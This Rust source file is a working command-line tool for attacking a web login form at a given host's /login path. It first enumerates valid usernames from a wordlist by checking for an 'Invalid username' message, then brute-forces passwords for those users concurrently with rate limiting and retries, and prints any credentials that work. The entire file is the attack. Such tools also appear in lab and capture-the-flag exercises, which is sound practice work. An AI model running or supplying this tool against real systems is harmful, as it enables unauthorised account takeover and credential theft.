use async_channel::{bounded, Receiver, Sender};
use clap::Parser;
use std::{process::exit, sync};

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Target host
    #[clap(short = 'H', long)]
    host: String,

    /// Path of the users wordlist
    #[clap(short, long)]
    users_wordlist: String,

    /// Path of the passwords wordlist
    #[clap(short, long)]
    passwords_wordlist: String,

    /// Requests per second
    #[clap(short, long, default_value = "10")]
    reqs_per_sec: usize,
}

#[tokio::main]
async fn main() {
    let args = Args::parse();

    let users_wordlist = tokio::fs::read_to_string(args.users_wordlist)
        .await
        .unwrap()
        .lines()
        .map(|line| line.trim().to_string())
        .collect::<Vec<_>>();

    let passwords_wordlist = tokio::fs::read_to_string(args.passwords_wordlist)
        .await
        .unwrap()
        .lines()
        .map(|line| line.trim().to_string())
        .collect::<Vec<_>>();

    let valid_users = sync::Arc::new(tokio::sync::Mutex::new(Vec::new()));

    let url = format!("https://{}/login", args.host);

    let (user_pass_tx, responses_rx) = rate_limiting_requests(&url, args.reqs_per_sec as u32).await;

    let handle = tokio::spawn(async move {
        for user in users_wordlist.into_iter() {
            user_pass_tx
                .send((user.to_string(), "password".to_string()))
                .await
                .unwrap();
        }

        user_pass_tx.close();
    });

    while let Ok(((user, _), response)) = responses_rx.recv().await {
        if response.status() != 200 {
            eprintln!("status: {}", response.status());
            exit(1);
        }

        let body = response.text().await.unwrap();

        if !body.contains("Invalid username") {
            valid_users.lock().await.push(user);
        }
    }

    handle.await.unwrap();
    responses_rx.close();

    // Brute force passwords

    let (user_pass_tx, responses_rx) = rate_limiting_requests(&url, args.reqs_per_sec as u32).await;

    let handle = tokio::spawn(async move {
        let valid_users = valid_users.lock().await;
        for user in valid_users.iter() {
            for passwords in passwords_wordlist.iter() {
                user_pass_tx
                    .send((user.to_string(), passwords.to_string()))
                    .await
                    .unwrap();
            }
        }

        user_pass_tx.close();
    });

    while let Ok(((user, password), response)) = responses_rx.recv().await {
        if response.status() != 200 {
            eprintln!("status: {}", response.status());
            exit(1);
        }

        let body = response.text().await.unwrap();

        if !body.contains("Incorrect password") {
            println!("valid credentials found: {user}:{password}");
        }
    }

    handle.await.unwrap();
    responses_rx.close();
}

async fn rate_limiting_requests(
    url: &str,
    reqs_per_sec: u32,
) -> (
    Sender<(String, String)>,
    Receiver<((String, String), reqwest::Response)>,
) {
    let (user_pass_tx, user_pass_rx) = bounded::<(String, String)>(1);
    let (responses_tx, responses_rx) = bounded::<((String, String), reqwest::Response)>(1);

    let client = reqwest::Client::new();

    let ongoing_requests = sync::Arc::new(tokio::sync::Mutex::new(0));

    for _ in 0..reqs_per_sec {
        let user_pass_rx = user_pass_rx.clone();
        let responses_tx = responses_tx.clone();
        let url = url.to_string();
        let client = client.clone();
        let ongoing_requests = ongoing_requests.clone();

        tokio::spawn(async move {
            while let Ok((user, password)) = user_pass_rx.recv().await {
                // wait until we have less than reqs_per_sec ongoing requests
                loop {
                    {
                        let mut ongoing_requests = ongoing_requests.lock().await;
                        if *ongoing_requests >= reqs_per_sec {
                            tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                            continue;
                        }

                        *ongoing_requests += 1;
                        eprintln!("ongoing requests: {}", *ongoing_requests);
                        break;
                    }
                }

                // make the request
                let params = [("username", user.as_str()), ("password", password.as_str())];
                eprintln!("trying user: '{user}'\tpassword: '{password}'");

                let mut result = client.post(&url).form(&params).send().await;
                for _retry in 0..3 {
                    if result.is_ok() {
                        break;
                    }

                    eprintln!("retrying...");

                    tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                    result = client.post(&url).form(&params).send().await
                }

                {
                    let mut ongoing_requests = ongoing_requests.lock().await;
                    *ongoing_requests -= 1;
                    eprintln!("ongoing requests: {}", *ongoing_requests);
                }

                // TODO: handle errors in a better way
                let Ok(result) = result else {
                    eprintln!("error: {}", result.unwrap_err());
                    exit(1);
                };

                responses_tx.send(((user, password), result)).await.unwrap();
            }
        });
    }

    (user_pass_tx, responses_rx)
}
